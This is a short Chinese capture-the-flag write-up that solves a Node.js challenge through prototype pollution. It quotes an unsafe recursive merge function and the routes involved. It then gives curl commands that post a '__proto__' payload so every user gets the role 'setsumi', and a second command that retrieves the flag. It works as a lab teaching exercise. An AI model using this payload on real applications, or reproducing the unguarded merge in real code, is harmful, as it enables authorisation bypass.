查看源码，`index.js`里头有明显的`merge`构造

```js
const updateInfo = (dest, src) => {
    for (const key in src) {
        if (
            key in dest && typeof dest[key] === "object" &&
            typeof src[key] === "object"
        ) {
            updateInfo(dest[key], src[key]);
        } else {
            dest[key] = src[key];
        }
    }
};
```

要构造原型链污染，目标是把`/flag`路由里头的`user.role`污染成"setsumi"

```js
app.get("/flag", (req, res) => {
    if (!req.session.loggedIn) {
        res.redirect("/login");
        return;
    }

    if (req.session.user.role === "setsumi") {
        res.render("flag", { flag: process.env.FLAG });
        return;
    }

    res.render("flag", { error: "You are not setsumi!" });
});
```

`user`的构造位置在`/register`路由里头

```js
app.post("/register", (req, res) => {
    const { username, password } = req.body;
    if (users[username]) {
        res.render("register", { error: "Username already exists" });
        return;
    }

    users[username] = { username, password }; // 注意这一行
    res.render("login", { success: "User registered successfully" });
});
```

于是我们往`Object`原型里加个值为"setsumi"的`role`字段就能过鉴权，入口在`/info`路由

```shell
curl 'http://localhost:8080/info' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: <cookie>' --data-raw 'info={ "bio": "111", "age": "222", "__proto__": { "role": "setsumi" }}'
curl -s 'http://localhost:8080/flag' -H 'Cookie: <cookie>' | grep Spirit
```

![[Pasted image 20241026212651.png]]